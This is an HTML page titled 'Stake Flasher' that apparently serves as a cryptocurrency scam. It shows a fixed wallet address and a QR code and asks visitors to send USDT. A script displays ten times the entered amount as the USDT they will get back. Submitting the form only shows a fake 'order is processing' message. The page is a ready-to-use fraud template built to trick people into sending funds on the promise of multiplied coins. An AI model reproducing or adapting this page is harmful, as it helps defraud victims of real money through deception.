
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Stake Flasher</title>
  <style>
    body {
      background-color: black;
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
    }
    #statusMessage {
      color: yellow;
      font-weight: bold;
      margin-top: 20px;
    }
    #conversionResult {
      margin-top: 10px;
      font-weight: bold;
      color: cyan;
    }
  </style>
</head>
<body>

  <h1>Send USDT</h1>
  <p>Wallet Address: <strong>0x24f551eae922e4a72b05f678626e86ee241461a0</strong></p>
  <img src="qr-code.png" alt="QR Code" width="200">

  <form id="myForm" onsubmit="return showProcessingMessage(event)">
    <input type="number" name="amount" id="amountInput" placeholder="Enter USDT Amount" required oninput="updateUSDTValue()">
    <div id="conversionResult"></div>
    <br><br>
    <button type="submit">Submit</button>
  </form>

  <p id="statusMessage"></p>

  <script>
    function showProcessingMessage(event) {
      event.preventDefault();
      const status = document.getElementById("statusMessage");
      status.innerText = "Your order is processing, please wait some time...";
      return false;
    }

    function updateUSDTValue() {
      const input = document.getElementById("amountInput").value;
      const result = document.getElementById("conversionResult");

      if (input && !isNaN(input)) {
        const converted = parseFloat(input) * 10;
        result.innerText = converted + " USDT";
      } else {
        result.innerText = "";
      }
    }
  </script>

</body>
</html>
